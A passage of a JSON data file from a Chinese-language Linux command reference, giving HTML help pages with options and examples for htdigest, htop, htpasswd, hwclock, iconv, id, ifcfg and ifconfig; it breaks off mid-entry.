        "body": "<h1 id=\"htdigest\">htdigest</h1>\n<p>Apache服务器内置工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>htdigest命令</strong> 是Apache的Web服务器内置工具，用于创建和更新储存用户名、域和用于摘要认证的密码文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">htdigest</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：创建密码文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  密码文件：指定要创建或更新的密码文件；</li>\n<li>  域：指定用户名所属的域；</li>\n<li>  用户名：要创建或者更新的用户名。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "htop",
        "des": "[非内部命令]一个互动的进程查看器，可以动态观察系统进程状况",
        "body": "<h1 id=\"htop\">htop</h1>\n<p>[非内部命令]一个互动的进程查看器，可以动态观察系统进程状况</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>htop命令 是Linux系统中的一个互动的进程查看器，一个文本模式的应用程序(在控制台或者X终端中)，需要ncurses。</p>\n<p>与Linux传统的top相比，htop更加人性化。它可让用户交互式操作，支持颜色主题，可横向或纵向滚动浏览进程列表，并支持鼠标操作。</p>\n<p>与top相比，htop有以下优点：</p>\n<ul>\n<li>可以横向或纵向滚动浏览进程列表，以便看到所有的进程和完整的命令行。</li>\n<li>在启动上，比top 更快。</li>\n<li>杀进程时不需要输入进程号。</li>\n<li>htop 支持鼠标操作。</li>\n<li>两者相比起来，top比较繁琐。</li>\n</ul>\n<p>top缺点：</p>\n<ul>\n<li>只支持键盘操作。</li>\n<li>显示也单调。</li>\n</ul>\n<p>htop 官网：<a href=\"http://htop.sourceforge.net/\">http://htop.sourceforge.net/</a></p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">htop</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">-C --no-color               使用单色配色方案\n-d <span class=\"hljs-attribute\">--delay</span>=DELAY            设置更新之间的延迟，在十秒\n-s <span class=\"hljs-attribute\">--sort-key</span>=COLUMN        纵列排序(try <span class=\"hljs-attribute\">--sort-key</span>=help <span class=\"hljs-keyword\">for</span> a list)\n-u <span class=\"hljs-attribute\">--user</span>=USERNAME          只显示一个指定用户的进程\n-p <span class=\"hljs-attribute\">--pid</span>=PID,[,PID,PID<span class=\"hljs-built_in\">..</span>.]  只显示给用户\n-h --help                   打印此命令帮助\n-v --version                打印版本信息\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<p>```shell\nh,?     F1：查看htop使用说明\nS       F2：设置\n/       F3：搜索进程\n\\       F4：过滤器，按关键字搜索\nt       F5：显示树形结构\n&lt;,&gt;     F6：选择排序方式\n[       F7：减少nice值，这样就可以提高对应进程的优先级\n]       F8：增加nice值，这样可以降低对应进程的优先级\nk       F9：杀掉选中的进程\nq       F10：退出htop</p>\n<p>/ : 搜索字符\nh : 显示帮助\nl : 显示进程打开的文件: 如果安装了lsof，按此键可以显示进程所打开的文件\nu : 显示所有用户，并可以选择某一特定用户的进程\nU : 取消标记所有的进程\ns : 将调用strace追踪进程的系统调用\nt : 显示树形结构</p>\n<p>H：显示/隐藏用户线程\nI：倒转排序顺序\nK：显示/隐藏内核线程<br>M：按内存占用排序\nP：按CPU排序<br>T：按运行时间排序</p>\n<p>上下键或PgUP， PgDn : 移动选中进程<br>左右键或Home， End : 移动列表<br>Space(空格) : 标记/取消标记一个进程。命令可以作用于多个进程，例如 \"kill\"，将应用于所有已标记的进程  </p>\n<p>```shell</p>\n<h3 id=\"htop设定\">Htop设定</h3>\n<p>鼠标点击Setup或者按下F2 之后进入htop 设定的页面</p>\n<h4 id=\"1-meters\">1. Meters</h4>\n<p>设定顶端的 显示信息，分为左右两侧，Left column 表示左侧的显示的信息，Right column表示右侧显示的信息，如果要新加选项，可以选择Available meters添加，F5新增到上方左侧，F6新增到上方右侧。Left column和Right column下面的选项，可以选定信息的显示方式，有LED、Bar(进度条)、Text(文本模式)，可以根据个人喜好进行设置</p>\n<h4 id=\"2-display-options\">2. Display options</h4>\n<p>选择要显示的内容，按空格 x表示显示，选择完后，按F10保存</p>\n<h4 id=\"3-colors\">3. Colors</h4>\n<p>设定界面以什么颜色来显示，个人认为用处不大，各人喜好不同</p>\n<h4 id=\"4-colums\">4. Colums</h4>\n<p>作用是增加或取消要显示的各项内容，选择后F7(向上移动)、F8(向下移动)、F9(取消显示、F10(保存更改))此处增加了PPID、PGRP，根据各人需求，显示那些信息。</p>\n<p><strong>F3 搜索进程</strong></p>\n<p>在界面下按F3或直接输入”/”就可以直接进入搜索模式，是按照进程名进行搜索的，搜索到的进程会用设定的颜色标记出来，方便查看。</p>\n<p><strong>F4：过滤器</strong></p>\n<p>相当于模糊查找，不区分大小写，下方输入要搜索的内容后，则界面只显示搜索到的内容，更加方便查看</p>\n<p><strong>F5:以树形方式显示</strong></p>\n<p><strong>F6：排序方式</strong></p>\n<p>按下F6后会跳转至以树形方式显示界面，让您选择以什么方式进行排序，在Sort by下选择您要以什么来排序</p>\n<p><strong>F7，F8：调整进程nice值</strong></p>\n<p>F7表示减小nice值(增大优先级)，F8增大nice值(减小优先级)，选择某一进程，按F7或F8来增大或减小nice值，nice值范围为-20-19</p>\n<p><strong>F9：杀死进程</strong></p>\n<p>选择某一进程按F9即可杀死此进程，很方便</p>\n<p><strong>F10:退出htop</strong></p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "htpasswd",
        "des": "apache服务器创建密码认证文件",
        "body": "<h1 id=\"htpasswd\">htpasswd</h1>\n<p>apache服务器创建密码认证文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>htpasswd命令</strong> 是Apache的Web服务器内置工具，用于创建和更新储存用户名、域和用户基本认证的密码文件。</p>\n<h3 id=\"语法\">语法</h3>\n<h3 id=\"htpasswd选项参数\">htpasswd(选项)(参数)</h3>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：创建一个加密文件；</span>\n<span class=\"hljs-deletion\">-n：不更新加密文件，只将加密后的用户名密码显示在屏幕上；</span>\n<span class=\"hljs-deletion\">-m：默认采用MD5算法对密码进行加密；</span>\n<span class=\"hljs-deletion\">-d：采用CRYPT算法对密码进行加密；</span>\n<span class=\"hljs-deletion\">-p：不对密码进行进行加密，即明文密码；</span>\n<span class=\"hljs-deletion\">-s：采用SHA算法对密码进行加密；</span>\n<span class=\"hljs-deletion\">-b：在命令行中一并输入用户名和密码而不是根据提示输入密码；</span>\n<span class=\"hljs-deletion\">-D：删除指定的用户。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  用户：要创建或者更新密码的用户名；</li>\n<li>  密码：用户的新密码。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>利用htpasswd命令添加用户</strong> </p>\n<pre><code class=\"language-shell\">htpasswd -bc <span class=\"hljs-selector-class\">.passwd</span> www<span class=\"hljs-selector-class\">.jsdig</span><span class=\"hljs-selector-class\">.com</span> php\n</code></pre>\n<p>在bin目录下生成一个.passwd文件，用户名<a href=\"http://www.jsdig.com%EF%BC%8C%E5%AF%86%E7%A0%81%EF%BC%9Aphp%EF%BC%8C%E9%BB%98%E8%AE%A4%E9%87%87%E7%94%A8MD5%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E3%80%82\">www.jsdig.com，密码：php，默认采用MD5加密方式。</a></p>\n<p> <strong>在原有密码文件中增加下一个用户</strong> </p>\n<pre><code class=\"language-shell\">htpasswd -<span class=\"hljs-keyword\">b </span>.passwd <span class=\"hljs-keyword\">Jack </span><span class=\"hljs-number\">123456</span>\n</code></pre>\n<p>去掉<code>-c</code>选项，即可在第一个用户之后添加第二个用户，依此类推。</p>\n<p> <strong>不更新密码文件，只显示加密后的用户名和密码</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">htpasswd</span> -nb Jack <span class=\"hljs-number\">123456</span>\n</code></pre>\n<p>不更新.passwd文件，只在屏幕上输出用户名和经过加密后的密码。</p>\n<p> <strong>利用htpasswd命令删除用户名和密码</strong> </p>\n<pre><code class=\"language-shell\">htpasswd -D <span class=\"hljs-string\">.passwd</span> Jack\n</code></pre>\n<p> <strong>利用htpasswd命令修改密码</strong> </p>\n<pre><code class=\"language-shell\">htpasswd -D .passwd <span class=\"hljs-keyword\">Jack\n</span>htpasswd -<span class=\"hljs-keyword\">b </span>.passwd <span class=\"hljs-keyword\">Jack </span><span class=\"hljs-number\">123456</span>\n</code></pre>\n<p>即先使用htpasswd删除命令删除指定用户，再利用htpasswd添加用户命令创建用户即可实现修改密码的功能。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "hwclock",
        "des": "显示与设定硬件时钟",
        "body": "<h1 id=\"hwclock\">hwclock</h1>\n<p>显示与设定硬件时钟</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>hwclock命令</strong> 是一个硬件时钟访问工具，它可以显示当前时间、设置硬件时钟的时间和设置硬件时钟为系统时间，也可设置系统时间为硬件时钟的时间。</p>\n<p>在Linux中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在BIOS画面设定的时钟。系统时钟则是指kernel中的时钟。当Linux启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有Linux相关指令与函数都是读取系统时钟的设定。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">hwclock</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-params\">--adjust</span>：hwclock每次更改硬件时钟时，都会记录在<span class=\"hljs-string\">/etc/adjtime</span>文件中。使用<span class=\"hljs-params\">--adjust</span>参数，可使hwclock根据先前的记录来估算硬件时钟的偏差，并用来校正目前的硬件时钟；\n<span class=\"hljs-params\">--debug</span>：显示hwclock执行时详细的信息；\n<span class=\"hljs-params\">--directisa</span>：hwclock预设从<span class=\"hljs-string\">/dev/rtc</span>设备来存取硬件时钟。若无法存取时，可用此参数直接以I/O指令来存取硬件时钟；\n<span class=\"hljs-params\">--hctosys</span>：将系统时钟调整为与目前的硬件时钟一致；\n<span class=\"hljs-params\">--set</span> <span class=\"hljs-params\">--date=</span>&lt;日期与时间&gt;：设定硬件时钟；\n<span class=\"hljs-params\">--show</span>：显示硬件时钟的时间与日期；\n<span class=\"hljs-params\">--systohc</span>：将硬件时钟调整为与目前的系统时钟一致；\n<span class=\"hljs-params\">--test</span>：仅测试程序，而不会实际更改硬件时钟；\n<span class=\"hljs-params\">--utc</span>：若要使用格林威治时间，请加入此参数，hwclock会执行转换的工作；\n<span class=\"hljs-params\">--version</span>：显示版本信息。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>设置硬件时间要依赖于操作系统时间，具体方法如下：</p>\n<pre><code class=\"language-shell\">hwclock –systohc\nhwclock <span class=\"hljs-comment\">--systohc –-utc</span>\n</code></pre>\n<p>不加任何参数使用hwclock，可以查看当前的硬件日期和时间。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">hwclock</span>\n</code></pre>\n<p>查看clock文件，确认是否设置了UTC：</p>\n<pre><code class=\"language-shell\">cat <span class=\"hljs-regexp\">/etc/</span><span class=\"hljs-keyword\">default</span>/rcS \nUTC=yes\n</code></pre>\n<p>在其他一些版本的Linux（如RebHat）中可以这样查看：</p>\n<pre><code class=\"language-shell\">cat /etc/sysconfig/clock\n<span class=\"hljs-attribute\">ZONE</span><span class=\"hljs-operator\">=</span><span class=\"hljs-string\">\"America/Los_Angeles\"</span>\n<span class=\"hljs-attribute\">UTC</span><span class=\"hljs-operator\">=</span>false\n<span class=\"hljs-attribute\">ARC</span><span class=\"hljs-operator\">=</span>false\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "iconv",
        "des": "转换文件的编码方式",
        "body": "<h1 id=\"iconv\">iconv</h1>\n<p>转换文件的编码方式</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iconv命令</strong> 是用来转换文件的编码方式的，比如它可以将UTF8编码的转换成GB18030的编码，反过来也行。JDK中也提供了类似的工具native2ascii。Linux下的iconv开发库包括iconv_open,iconv_close,iconv等C函数，可以用来在C/C++程序中很方便的转换字符编码，这在抓取网页的程序中很有用处，而iconv命令在调试此类程序时用得着。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">iconv -f encoding <span class=\"hljs-selector-attr\">[-t encoding]</span> <span class=\"hljs-selector-attr\">[inputfile]</span>... \n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f encoding :把字符从encoding编码开始转换。 </span>\n<span class=\"hljs-deletion\">-t encoding :把字符转换到encoding编码。 </span>\n<span class=\"hljs-deletion\">-l :列出已知的编码字符集合 </span>\n<span class=\"hljs-deletion\">-o file :指定输出文件 </span>\n<span class=\"hljs-deletion\">-c :忽略输出的非法字符 </span>\n<span class=\"hljs-deletion\">-s :禁止警告信息，但不是错误信息 </span>\n<span class=\"hljs-deletion\">--verbose :显示进度信息 </span>\n<span class=\"hljs-deletion\">-f和-t所能指定的合法字符在-l选项的命令里面都列出来了。 </span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>列出当前支持的字符编码：&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iconv -l</span> \n</code></pre>\n<p>将文件file1转码，转后文件输出到fil2中：&nbsp;</p>\n<pre><code class=\"language-shell\">iconv file1 -f EUC-JP-<span class=\"hljs-keyword\">MS</span> <span class=\"hljs-title\">-t</span> UTF-<span class=\"hljs-number\">8</span> -o file2 \n</code></pre>\n<p>这里，没<code>-o</code>那么会输出到标准输出。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "id",
        "des": "打印真实以及有效的用户和所在组的信息",
        "body": "<h1 id=\"id\">id</h1>\n<p>打印真实以及有效的用户和所在组的信息</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">id [<span class=\"hljs-symbol\">OPTION</span>]... [<span class=\"hljs-symbol\">USER</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>没有选项时，打印指定用户ID信息。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a               兼容性选项，没有实际作用。</span>\n<span class=\"hljs-deletion\">-Z, --context    只打印进程的安全上下文。</span>\n<span class=\"hljs-deletion\">-g, --group      只打印有效的组ID。</span>\n<span class=\"hljs-deletion\">-G, --groups     打印全部组ID。</span>\n<span class=\"hljs-deletion\">-u, --user       只打印有效的用户ID。</span>\n<span class=\"hljs-deletion\">-z, --zero       使用空字符代替默认的空格来分隔条目。</span>\n<span class=\"hljs-deletion\">--help           显示帮助信息并退出。</span>\n<span class=\"hljs-deletion\">--version        显示版本信息并退出。</span>\n</code></pre>\n<p>只有在使用 <code>-u</code> <code>-g</code> <code>-G</code> 选项中一到多个时，以下选项可以使用：</p>\n<pre><code class=\"language-shell\">-n, <span class=\"hljs-comment\">--name    打印名称而不是数字。</span>\n-r, <span class=\"hljs-comment\">--real    打印真实ID而不是有效ID。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>user（可选）：可以为一到多个，默认为当前用户。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-attr\"># id\nuid=0</span><span class=\"hljs-comment\">(root)</span> gid=<span class=\"hljs-number\">0</span><span class=\"hljs-comment\">(root)</span> groups=<span class=\"hljs-number\">0</span><span class=\"hljs-comment\">(root)</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-comment\">(bin)</span>,<span class=\"hljs-number\">2</span><span class=\"hljs-comment\">(daemon)</span>,<span class=\"hljs-number\">3</span><span class=\"hljs-comment\">(sys)</span>,<span class=\"hljs-number\">4</span><span class=\"hljs-comment\">(adm)</span>,<span class=\"hljs-number\">6</span><span class=\"hljs-comment\">(disk)</span>,<span class=\"hljs-number\">10</span><span class=\"hljs-comment\">(wheel)</span>\n</code></pre>\n<p>解释：用户root的UID号码 = 0，GID号码 = 0。用户root是下面组的成员：</p>\n<ul>\n<li>root组GID号是：0</li>\n<li>bin组GID号是：1</li>\n<li>daemon组GID号是：2</li>\n<li>sys组GID号是：3</li>\n<li>adm组GID号是：4</li>\n<li>disk组GID号是：6</li>\n<li>wheel组GID号是：10</li>\n</ul>\n<p>打印用户名、UID 和该用户所属的所有组，要这么做，我们可以使用 -a 选项：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-attr\"># id -a\nuid=0</span><span class=\"hljs-comment\">(root)</span> gid=<span class=\"hljs-number\">0</span><span class=\"hljs-comment\">(root)</span> groups=<span class=\"hljs-number\">0</span><span class=\"hljs-comment\">(root)</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-comment\">(bin)</span>,<span class=\"hljs-number\">2</span><span class=\"hljs-comment\">(daemon)</span>,<span class=\"hljs-number\">3</span><span class=\"hljs-comment\">(sys)</span>,<span class=\"hljs-number\">4</span><span class=\"hljs-comment\">(adm)</span>,<span class=\"hljs-number\">6</span><span class=\"hljs-comment\">(disk)</span>,<span class=\"hljs-number\">10</span><span class=\"hljs-comment\">(wheel)</span>\n</code></pre>\n<p>输出所有不同的组ID ，有效的，真实的和补充的，我们可以使用 -G 选项来实现：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># id -G</span>\n0<span class=\"hljs-number\"> 1 </span>2<span class=\"hljs-number\"> 3 </span>4<span class=\"hljs-number\"> 6 </span>10\n</code></pre>\n<p>结果只会显示GID号。你可以和<code>/etc/group</code>文件比较。下面是<code>/etc/group</code>文件的示例内容：</p>\n<p>只输出有效的组ID，通过使用 -g 选项来只输出有效组ID：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># id -g</span>\n<span class=\"hljs-number\">0</span>\n</code></pre>\n<p>输出特定用户信息，我们可以输出特定的用户信息相关的UID和GID。只需要在id命令后跟上用户名：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# id www\n<span class=\"hljs-attribute\">uid</span>=500(www) <span class=\"hljs-attribute\">gid</span>=500(www) <span class=\"hljs-attribute\">groups</span>=500(www)\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p>该命令可以显示真实有效的用户ID(UID)和组ID(GID)。UID 是对一个用户的单一身份标识。组ID（GID）则对应多个UID；一些程序可能需要UID/GID来运行。<code>id</code> 使我们更加容易地找出用户的UID以及GID，而不必在 <code>/etc/group</code> 文件中搜寻。</p>\n</li>\n<li><p>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 id</code>，<code>info coreutils 'id invocation'</code>。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ifcfg",
        "des": "置Linux中的网络接口参数",
        "body": "<h1 id=\"ifcfg\">ifcfg</h1>\n<p>置Linux中的网络接口参数</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ifcfg命令</strong> 是一个Bash脚本程序，用来设置Linux中的网络接口参数。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ifcfg</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">网络接口：指定要操作的网络接口；\n<span class=\"hljs-keyword\">add</span>/del：添加或删除网络接口上的地址；\n<span class=\"hljs-built_in\">ip</span>地址：指定<span class=\"hljs-built_in\">IP</span>地址和子网掩码；\nStop：停用指定的网络接口的<span class=\"hljs-built_in\">IP</span>地址。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ifconfig",
        "des": "配置和显示Linux系统网卡的网络参数",
        "body": "<h1 id=\"ifconfig\">ifconfig</h1>\n<p>配置和显示Linux系统网卡的网络参数</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ifconfig命令</strong> 被用于配置和显示Linux内核中网络接口的网络参数。用ifconfig命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ifconfig</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">add<span class=\"hljs-attribute\">&lt;地址&gt;</span>：设置网络设备IPv6的ip地址；\ndel<span class=\"hljs-attribute\">&lt;地址&gt;</span>：删除网络设备IPv6的IP地址；\ndown：关闭指定的网络设备；\n<span class=\"hljs-attribute\">&lt;hw&lt;网络设备类型&gt;</span><span class=\"hljs-attribute\">&lt;硬件地址&gt;</span>：设置网络设备的类型与硬件地址；\nio_addr<span class=\"hljs-attribute\">&lt;I/O地址&gt;</span>：设置网络设备的I/O地址；\nirq<span class=\"hljs-attribute\">&lt;IRQ地址&gt;</span>：设置网络设备的IRQ；\nmedia<span class=\"hljs-attribute\">&lt;网络媒介类型&gt;</span>：设置网络设备的媒介类型；\nmem_start<span class=\"hljs-attribute\">&lt;内存地址&gt;</span>：设置网络设备在主内存所占用的起始地址；\nmetric<span class=\"hljs-attribute\">&lt;数目&gt;</span>：指定在计算数据包的转送次数时，所要加上的数目；\nmtu<span class=\"hljs-attribute\">&lt;字节&gt;</span>：设置网络设备的MTU；\nnetmask<span class=\"hljs-attribute\">&lt;子网掩码&gt;</span>：设置网络设备的子网掩码；\ntunnel<span class=\"hljs-attribute\">&lt;地址&gt;</span>：建立IPv4与IPv6之间的隧道通信地址；\nup：启动指定的网络设备；\n-broadcast<span class=\"hljs-attribute\">&lt;地址&gt;</span>：将要送往指定地址的数据包当成广播数据包来处理；\n-pointopoint<span class=\"hljs-attribute\">&lt;地址&gt;</span>：与指定地址的网络设备建立直接连线，此模式具有保密功能；\n-promisc：关闭或启动指定网络设备的promiscuous模式；\nIP地址：指定网络设备的IP地址；\n网络设备：指定网络设备的名称。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>显示网络设备信息（激活状态的）：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost ~]# ifconfig\neth0      Link encap:Ethernet  HWaddr <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">3</span>E:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">1</span>E:<span class=\"hljs-number\">51</span>  \n          inet addr:<span class=\"hljs-number\">10.160</span>.<span class=\"hljs-number\">7.81</span>  Bcas<span class=\"hljs-variable\">t:10</span>.<span class=\"hljs-number\">160.15</span>.<span class=\"hljs-number\">255</span>  Mask:<span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">240.0</span>\n          UP BROADCAST RUNNING MULTICAST  MTU:<span class=\"hljs-number\">1500</span>  Metric:<span class=\"hljs-number\">1</span>\n          RX packet<span class=\"hljs-variable\">s:61430830</span> error<span class=\"hljs-variable\">s:0</span> dropped:<span class=\"hljs-number\">0</span> overrun<span class=\"hljs-variable\">s:0</span> frame:<span class=\"hljs-number\">0</span>\n          TX packet<span class=\"hljs-variable\">s:88534</span> error<span class=\"hljs-variable\">s:0</span> dropped:<span class=\"hljs-number\">0</span> overrun<span class=\"hljs-variable\">s:0</span> carrier:<span class=\"hljs-number\">0</span>\n          collision<span class=\"hljs-variable\">s:0</span> txqueuelen:<span class=\"hljs-number\">1000</span>\n          RX byte<span class=\"hljs-variable\">s:3607197869</span> (<span class=\"hljs-number\">3.3</span> GiB)  TX byte<span class=\"hljs-variable\">s:6115042</span> (<span class=\"hljs-number\">5.8</span> MiB)\n\n<span class=\"hljs-keyword\">lo</span>        Link encap:Local Loopback  \n          inet addr:<span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>  Mask:<span class=\"hljs-number\">255.0</span>.<span class=\"hljs-number\">0.0</span>\n          UP LOOPBACK RUNNING  MTU:<span class=\"hljs-number\">16436</span>  Metric:<span class=\"hljs-number\">1</span>\n          RX packet<span class=\"hljs-variable\">s:56103</span> error<span class=\"hljs-variable\">s:0</span> dropped:<span class=\"hljs-number\">0</span> overrun<span class=\"hljs-variable\">s:0</span> frame:<span class=\"hljs-number\">0</span>\n          TX packet<span class=\"hljs-variable\">s:56103</span> error<span class=\"hljs-variable\">s:0</span> dropped:<span class=\"hljs-number\">0</span> overrun<span class=\"hljs-variable\">s:0</span> carrier:<span class=\"hljs-number\">0</span>\n          collision<span class=\"hljs-variable\">s:0</span> txqueuelen:<span class=\"hljs-number\">0</span>\n          RX byte<span class=\"hljs-variable\">s:5079451</span> (<span class=\"hljs-number\">4.8</span> MiB)  TX byte<span class=\"hljs-variable\">s:5079451</span> (<span class=\"hljs-number\">4.8</span> MiB)\n</code></pre>\n<p>说明：</p>\n<p><strong>eth0</strong> 表示第一块网卡，其中<code>HWaddr</code>表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是<code>00:16:3E:00:1E:51</code>。</p>\n<p><strong>inet addr</strong> 用来表示网卡的IP地址，此网卡的IP地址是<code>10.160.7.81</code>，广播地址<code>Bcast:10.160.15.255</code>，掩码地址<code>Mask:255.255.240.0</code>。</p>\n<p><strong>lo</strong> 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 httpd服务器的指定到回坏地址，在浏览器输入127.0.0.1就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。</p>\n<ul>\n<li>  第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址）。</li>\n<li>  第二行：网卡的IP地址、子网、掩码。</li>\n<li>  第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节。</li>\n<li>  第四、五行：接收、发送数据包情况统计。</li>\n<li>  第七行：接收、发送数据字节数统计信息。</li>\n</ul>\n<p><strong>启动关闭指定网卡：</strong> </p>\n<pre><code class=\"language-shell\">ifconfig eth0 <span class=\"hljs-meta\">up</span>\nifconfig eth0 <span class=\"hljs-meta\">down</span>\n</code></pre>\n<p><code>ifconfig eth0 up</code>为启动网卡eth0，<code>ifconfig eth0 down</code>为关闭网卡eth0。ssh登陆linux服务器操作要小心，关闭了就不能开启了，除非你有多网卡。</p>\n<p><strong>为网卡配置和删除IPv6地址：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ifconfig</span> eth0 add <span class=\"hljs-number\">33</span>ffe:<span class=\"hljs-number\">3240</span>:<span class=\"hljs-number\">800</span>:<span class=\"hljs-number\">1005</span>::<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">64</span>    #为网卡eth0配置IPv6地址\n<span class=\"hljs-attribute\">ifconfig</span> eth0 del <span class=\"hljs-number\">33</span>ffe:<span class=\"hljs-number\">3240</span>:<span class=\"hljs-number\">800</span>:<span class=\"hljs-number\">1005</span>::<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">64</span>    #为网卡eth0删除IPv6地址\n</code></pre>\n<p><strong>用ifconfig修改MAC地址：</strong> </p>\n<pre><code class=\"language-shell\">ifconfig eth0 hw ether 00<span class=\"hljs-symbol\">:AA</span><span class=\"hljs-symbol\">:BB</span><span class=\"hljs-symbol\">:CC</span><span class=\"hljs-symbol\">:dd</span><span class=\"hljs-symbol\">:EE</span>\n</code></pre>\n<p><strong>配置IP地址：</strong> </p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># ifconfig eth0 192.168.2.10</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># ifconfig eth0 192.168.2.10 netmask 255.255.255.0</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># ifconfig eth0 192.168.2.10 netmask 255.255.255.0 broadcast 192.168.2.255</span>\n</code></pre>\n<p><strong>启用和关闭arp协议：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ifconfig</span> eth0 arp    <span class=\"hljs-comment\">#开启网卡eth0 的arp协议</span>\nifconfig eth0 -arp   <span class=\"hljs-comment\">#关闭网卡eth0 的arp协议</span>\n</code></pre>\n<p><strong>设置最大传输单元：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ifconfig</span> eth0 mtu <span class=\"hljs-number\">1500</span>    #设置能通过的最大数据包大小为 <span class=\"hljs-number\">1500</span> bytes\n</code></pre>\n<p><strong>其它实例</strong></p>\n<pre><code 